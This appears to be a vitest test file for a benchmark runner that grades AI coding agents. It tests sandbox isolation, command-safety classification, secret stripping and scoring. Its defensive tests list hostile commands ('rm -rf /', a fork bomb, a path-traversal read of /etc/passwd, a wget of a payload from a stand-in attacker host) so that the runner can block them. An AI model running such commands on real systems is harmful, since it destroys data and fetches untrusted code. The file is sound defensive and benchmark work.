import { describe, it, expect } from 'vitest';
import {
  DynoRunner,
  DynoSandbox,
  DynoTracer,
  classifyCommandSafety,
  sanitizeEnvironment,
  gradeTaskAttempt,
  detectLocalEnvironment,
  calculateDynoScore,
  calculateScoreVariance,
  sha256,
  sha256Json,
  getFixtureByKey,
  DynoAgentHarness,
  DynoSubjectRecord
} from '../src/lib/dyno';

describe('DYNO Runner Foundation & Execution Engine', () => {
  describe('Deterministic Crypto & Digests', () => {
    it('should compute consistent SHA-256 hashes regardless of JSON key order', () => {
      const objA = { z: 1, a: 'hello', nested: { beta: 2, alpha: 1 } };
      const objB = { nested: { alpha: 1, beta: 2 }, a: 'hello', z: 1 };

      const hashA = sha256Json(objA);
      const hashB = sha256Json(objB);

      expect(hashA).toBe(hashB);
      expect(hashA).toHaveLength(64);
    });

    it('should produce valid SHA-256 for strings and buffers', () => {
      const hash = sha256('dyno-benchmark-test');
      expect(hash).toHaveLength(64);
      expect(hash).toMatch(/^[0-9a-f]{64}$/);
    });
  });

  describe('Sandbox Isolation & Safety', () => {
    it('should block directory traversal attacks out of the sandbox root', async () => {
      const sandbox = await DynoSandbox.create({ prefix: 'dyno-test-traversal-' });

      try {
        await expect(sandbox.readFile('../../../etc/passwd')).rejects.toThrow(/Path traversal violation/);
        await expect(sandbox.writeFile('../../forbidden.txt', 'evil')).rejects.toThrow(/Path traversal violation/);
      } finally {
        await sandbox.cleanup();
      }
    });

    it('should accurately classify dangerous commands as violations', () => {
      expect(classifyCommandSafety('rm -rf /')).toBe('violation');
      expect(classifyCommandSafety('rm -fr $HOME')).toBe('violation');
      expect(classifyCommandSafety(':(){ :|:& };:')).toBe('violation');
      expect(classifyCommandSafety('cat file.txt > /etc/passwd')).toBe('violation');
      expect(classifyCommandSafety('node -e "console.log(1)"')).toBe('allowed');
      expect(classifyCommandSafety('ls -la')).toBe('allowed');
    });

    it('should block network commands when network policy is none', () => {
      expect(classifyCommandSafety('curl https://example.com', 'none')).toBe('blocked');
      expect(classifyCommandSafety('wget http://attacker.com/payload', 'none')).toBe('blocked');
      expect(classifyCommandSafety('git clone https://github.com/repo', 'none')).toBe('blocked');
      expect(classifyCommandSafety('npm test', 'none')).toBe('allowed');
      expect(classifyCommandSafety('curl http://localhost:8787/health', 'local_only')).toBe('allowed');
      expect(classifyCommandSafety('curl https://example.com', 'local_only')).toBe('blocked');
    });

    it('should enforce a blocked network policy before spawning the command', async () => {
      const sandbox = await DynoSandbox.create({ prefix: 'dyno-test-network-', networkPolicy: 'none' });
      try {
        const result = await sandbox.exec('curl https://example.com');
        expect(result.exitCode).toBe(126);
        expect(result.stderr).toContain('network policy denied execution');
      } finally {
        await sandbox.cleanup();
      }
    });

    it('should refuse to execute destructive commands on host inside sandbox', async () => {
      const sandbox = await DynoSandbox.create({ prefix: 'dyno-test-safety-' });

      try {
        const result = await sandbox.exec('rm -rf /');
        expect(result.exitCode).toBe(126);
        expect(result.stderr).toContain('blocked by DYNO safety policy');
      } finally {
        await sandbox.cleanup();
      }
    });

    it('should sanitize environment variables to prevent secret leakage', () => {
      process.env.OPENAI_API_KEY = 'sk-test-secret-key-12345';
      process.env.CLOUDFLARE_API_TOKEN = 'cf-token-secret-67890';
      process.env.MY_SUPER_SECRET_PASSWORD = 'super-secret-password';

      const sanitized = sanitizeEnvironment({ CUSTOM_VAR: 'custom-val' });

      expect(sanitized.OPENAI_API_KEY).toBeUndefined();
      expect(sanitized.CLOUDFLARE_API_TOKEN).toBeUndefined();
      expect(sanitized.MY_SUPER_SECRET_PASSWORD).toBeUndefined();
      expect(sanitized.CUSTOM_VAR).toBe('custom-val');
      expect(sanitized.PATH).toBeDefined();
      expect(sanitized.NODE_ENV).toBe('test');

      delete process.env.OPENAI_API_KEY;
      delete process.env.CLOUDFLARE_API_TOKEN;
      delete process.env.MY_SUPER_SECRET_PASSWORD;
    });

    it('should enforce command execution timeouts', async () => {
      const sandbox = await DynoSandbox.create({ prefix: 'dyno-test-timeout-' });

      try {
        const result = await sandbox.exec('node -e "while(true){}"', [], { timeoutMs: 300 });
        expect(result.timedOut).toBe(true);
        expect(result.exitCode).toBe(124);
        expect(result.stderr).toContain('timed out');
      } finally {
        await sandbox.cleanup();
      }
    });

    it('should track modified, created, and deleted files accurately', async () => {
      const sandbox = await DynoSandbox.create({
        initialFiles: {
          'src/app.js': 'console.log("initial");',
          'README.md': '# Test'
        },
        prefix: 'dyno-test-diff-'
      });

      try {
        await sandbox.writeFile('src/app.js', 'console.log("modified");');
        await sandbox.writeFile('src/newFile.js', 'console.log("new");');
        await sandbox.deleteFile('README.md');

        const changes = await sandbox.getFileChanges(['src/app.js']);

        expect(changes.modified).toEqual(['src/app.js']);
        expect(changes.created).toEqual(['src/newFile.js']);
        expect(changes.deleted).toEqual(['README.md']);
        expect(changes.unnecessaryChanges).toEqual(['README.md', 'src/newFile.js']);
      } finally {
        await sandbox.cleanup();
      }
    });
  });

  describe('Trace Capture & Tool Events', () => {
    it('should record tool events sequentially with digests and offsets', () => {
      const tracer = new DynoTracer({ taskAttemptId: 'att_001' });

      const evt1 = tracer.recordToolEvent({
        toolName: 'read_file',
        commandClass: 'fs_read',
        input: { path: 'src/main.js' },
        output: { content: 'const a = 1;' },
        durationMs: 5
      });

      const evt2 = tracer.recordToolEvent({
        toolName: 'exec',
        commandClass: 'process_exec',
        input: 'node test/verify.js',
        output: { exitCode: 0, stdout: 'PASS' },
        durationMs: 42,
        exitCode: 0
      });

      expect(evt1.tool_name).toBe('read_file');
      expect(evt2.tool_name).toBe('exec');

      const events = tracer.getEvents();
      expect(events).toHaveLength(2);
      expect(events[0].sequence_number).toBe(0);
      expect(events[1].sequence_number).toBe(1);
      expect(events[0].input_digest).toHaveLength(64);
      expect(events[1].output_digest).toHaveLength(64);
      expect(tracer.computeTraceSha256()).toHaveLength(64);
    });
  });

  describe('Local Environment Detection', () => {
    it('should detect machine environment deterministically without random metrics', () => {
      const env = detectLocalEnvironment('none');

      expect(env.os_name).toBeDefined();
      expect(env.architecture).toBeDefined();
      expect(env.memory_bytes).toBeGreaterThan(0);
      expect(env.container_image_digest).toHaveLength(64);
      expect(env.network_policy).toBe('none');
      expect(JSON.parse(env.runtime_manifest).nodeVersion).toBe(process.version);
    });
  });

  describe('Deterministic Grading Engine', () => {
    it('should grade a fixed fixture as passed and broken fixture as failed', async () => {
      const fixture = getFixtureByKey('neutral_cli_arg_parser')!;
      expect(fixture).toBeDefined();

      // 1. Broken state
      const brokenSandbox = await DynoSandbox.create({
        initialFiles: fixture.files,
        prefix: 'dyno-grade-broken-'
      });

      try {
        const brokenOutcome = await gradeTaskAttempt('att_broken', fixture, brokenSandbox);
        expect(brokenOutcome.passed).toBe(false);
      } finally {
        await brokenSandbox.cleanup();
      }

      // 2. Fixed state
      const fixedSandbox = await DynoSandbox.create({
        initialFiles: fixture.files,
        prefix: 'dyno-grade-fixed-'
      });

      try {
        const fixedCode = `function parseArgs(args, booleanFlags = []) {
  const flags = {};
  const positional = [];
  const boolSet = new Set(booleanFlags);

  for (let i = 0; i < args.length; i++) {
    const arg = args[i];
    if (arg.startsWith('--')) {
      const key = arg.slice(2);
      if (boolSet.has(key)) {
        flags[key] = true;
      } else if (i + 1 < args.length && !args[i + 1].startsWith('--')) {
        flags[key] = args[++i];
      } else {
        flags[key] = true;
      }
    } else {
      positional.push(arg);
    }
  }
  return { flags, positional };
}
module.exports = { parseArgs };
`;
        await fixedSandbox.writeFile('src/parser.js', fixedCode);

        const fixedOutcome = await gradeTaskAttempt('att_fixed', fixture, fixedSandbox);
        expect(fixedOutcome.passed).toBe(true);
        expect(fixedOutcome.hiddenTestsPassed).toBe(1);
        expect(fixedOutcome.graderResults[0].passed).toBe(1);
        expect(fixedOutcome.graderResults[0].evidence_digest).toHaveLength(64);
      } finally {
        await fixedSandbox.cleanup();
      }
    });
  });

  describe('Full Runner Pipeline & Honest Error States', () => {
    const mockSubject: DynoSubjectRecord = {
      id: 'subj_test_model_v1',
      model_provider: 'anthropic',
      model_id: 'claude-3-7-sonnet',
      model_version: '20260228',
      model_config: JSON.stringify({ temperature: 0.1 }),
      agent_harness: 'antigravity-cli',
      harness_version: '2.4.0',
      tool_manifest: JSON.stringify(['read_file', 'write_file', 'exec'])
    };

    it('should execute a task attempt and record honest completion metrics', async () => {
      const fixture = getFixtureByKey('neutral_cli_arg_parser')!;

      // Successful simulated agent
      const passingHarness: DynoAgentHarness = {
        name: 'PassingAgent',
        version: '1.0.0',
        modelProvider: 'anthropic',
        modelId: 'claude-3-7-sonnet',
        toolManifest: ['read_file', 'write_file', 'exec'],
        async execute(ctx) {
          const content = await ctx.sandbox.readFile('src/parser.js');
          const fixed = content.replace(
            "// BUG: Consumes next arg even if it is a boolean flag or another flag\n      if (i + 1 < args.length && !args[i + 1].startsWith('--')) {",
            "if (boolSet.has(key)) {\n        flags[key] = true;\n      } else if (i + 1 < args.length && !args[i + 1].startsWith('--')) {"
          );
          await ctx.sandbox.writeFile('src/parser.js', fixed);
          return {
            tokensUsed: { input: 1200, output: 250, cachedInput: 800 },
            costMicros: 4500,
            humanInterventions: 0
          };
        }
      };

      const runner = new DynoRunner({
        subject: mockSubject,
        fixtures: [fixture],
        repetitions: 1
      });

      const attemptResult = await runner.runTaskAttempt(fixture, passingHarness, 1, 1);

      expect(attemptResult.attempt.status).toBe('passed');
      expect(attemptResult.attempt.first_attempt_success).toBe(1);
      expect(attemptResult.attempt.hidden_tests_passed).toBe(1);
      expect(attemptResult.attempt.input_tokens).toBe(1200);
      expect(attemptResult.attempt.output_tokens).toBe(250);
      expect(attemptResult.attempt.cost_micros).toBe(4500);
      expect(attemptResult.attempt.safety_violations).toBe(0);
      expect(attemptResult.attempt.result_digest).toHaveLength(64);
      expect(attemptResult.toolEvents.length).toBeGreaterThanOrEqual(2);
    });

    it('does not expose hidden tests, graders, or grader-only files to the agent harness', async () => {
      const fixture = getFixtureByKey('neutral_lru_cache_ttl')!;
      let observedTaskKeys: string[] = [];
      let observedFiles: string[] = [];
      const inspectingHarness: DynoAgentHarness = {
        name: 'BoundaryInspector',
        version: '1.0.0',
        modelProvider: 'test',
        modelId: 'boundary-inspector',
        toolManifest: ['list_files'],
        async execute(ctx) {
          observedTaskKeys = Object.keys(ctx.task).sort();
          observedFiles = await ctx.sandbox.listFiles();
        }
      };
      const runner = new DynoRunner({ subject: mockSubject, fixtures: [fixture], repetitions: 1 });
      await runner.runTaskAttempt(fixture, inspectingHarness, 1, 1);

      expect(observedTaskKeys).not.toContain('hiddenFiles');
      expect(observedTaskKeys).not.toContain('hiddenTests');
      expect(observedTaskKeys).not.toContain('graders');
      expect(observedFiles.some(path => path.includes('.dyno-hidden'))).toBe(false);
    });

    it('should record honest failure when agent crashes with exception', async () => {
      const fixture = getFixtureByKey('neutral_cli_arg_parser')!;

      const crashingHarness: DynoAgentHarness = {
        name: 'CrashingAgent',
        version: '1.0.0',
        modelProvider: 'test',
        modelId: 'test',
        toolManifest: [],
        async execute() {
          throw new Error('LLM Context Window Exceeded');
        }
      };

      const runner = new DynoRunner({
        subject: mockSubject,
        fixtures: [fixture],
        repetitions: 1
      });

      const attemptResult = await runner.runTaskAttempt(fixture, crashingHarness, 1, 1);

      expect(attemptResult.attempt.status).toBe('failed');
      expect(attemptResult.attempt.first_attempt_success).toBe(0);
      expect(attemptResult.error).toContain('LLM Context Window Exceeded');
    });

    it('should record unsafe attempt when harness executes critical safety violations', async () => {
      const fixture = getFixtureByKey('neutral_cli_arg_parser')!;

      const maliciousHarness: DynoAgentHarness = {
        name: 'UnsafeAgent',
        version: '1.0.0',
        modelProvider: 'test',
        modelId: 'test',
        toolManifest: [],
        async execute(ctx) {
          await ctx.sandbox.exec('rm -rf /');
        }
      };

      const runner = new DynoRunner({
        subject: mockSubject,
        fixtures: [fixture],
        repetitions: 1
      });

      const attemptResult = await runner.runTaskAttempt(fixture, maliciousHarness, 1, 1);

      expect(attemptResult.attempt.status).toBe('unsafe');
      expect(attemptResult.attempt.safety_violations).toBeGreaterThanOrEqual(1);
    });

    it('should keep multi-repetition Street measurements self-reported', async () => {
      const fixture = getFixtureByKey('neutral_cli_arg_parser')!;

      const reliableHarness: DynoAgentHarness = {
        name: 'ReliableAgent',
        version: '1.0.0',
        modelProvider: 'anthropic',
        modelId: 'claude-3-7-sonnet',
        toolManifest: ['read_file', 'write_file'],
        async execute(ctx) {
          const content = await ctx.sandbox.readFile('src/parser.js');
          const fixed = content.replace(
            "// BUG: Consumes next arg even if it is a boolean flag or another flag\n      if (i + 1 < args.length && !args[i + 1].startsWith('--')) {",
            "if (boolSet.has(key)) {\n        flags[key] = true;\n      } else if (i + 1 < args.length && !args[i + 1].startsWith('--')) {"
          );
          await ctx.sandbox.writeFile('src/parser.js', fixed);
          return {
            tokensUsed: { input: 1000, output: 200, cachedInput: 500 },
            costMicros: 3000
          };
        }
      };

      const runner = new DynoRunner({
        subject: mockSubject,
        fixtures: [fixture],
        repetitions: 2
      });

      const suiteResult = await runner.runSuite(reliableHarness);

      expect(suiteResult.run.repetition).toBe(2);
      expect(suiteResult.run.status).toBe('completed');
      expect(suiteResult.run.verification_status).toBe('unverified');
      expect(suiteResult.run.overall_score).toBeGreaterThan(800);
      expect(suiteResult.run.runner_attestation_digest).toHaveLength(64);
      expect(suiteResult.run.raw_trace_sha256).toHaveLength(64);
      expect(suiteResult.summary.tasksPassed).toBe(2); // 1 task * 2 repetitions
      expect(suiteResult.summary.completionRate).toBe(100);
    });
  });

  describe('Score & Variance Mathematical Integrity', () => {
    it('should compute exact mean and stdDev across repetitions', () => {
      const scores = [850, 860, 840];
      const variance = calculateScoreVariance(scores);

      expect(variance.mean).toBe(850);
      expect(variance.maxDiff).toBe(20);
      expect(variance.stdDev).toBeGreaterThan(0);
    });

    it('should compute deterministic score breakdown with zero random numbers', () => {
      const score = calculateDynoScore({
        tasksCompleted: 8,
        totalTasks: 10,
        firstAttemptSuccessRate: 0.8,
        hiddenTestsPassedRate: 0.9,
        medianCompletionSeconds: 120,
        humanInterventions: 0,
        safetyViolations: 0,
        unnecessaryFilesChanged: 0
      });

      expect(score.score).toBeGreaterThan(700);
      expect(score.grade).toBeDefined();
      expect(score.breakdown.completionPoints).toBe(280); // (8/10) * 350
      expect(score.breakdown.hiddenTestPoints).toBe(225); // 0.9 * 250
      expect(score.breakdown.firstAttemptPoints).toBe(120); // 0.8 * 150
    });
  });
});
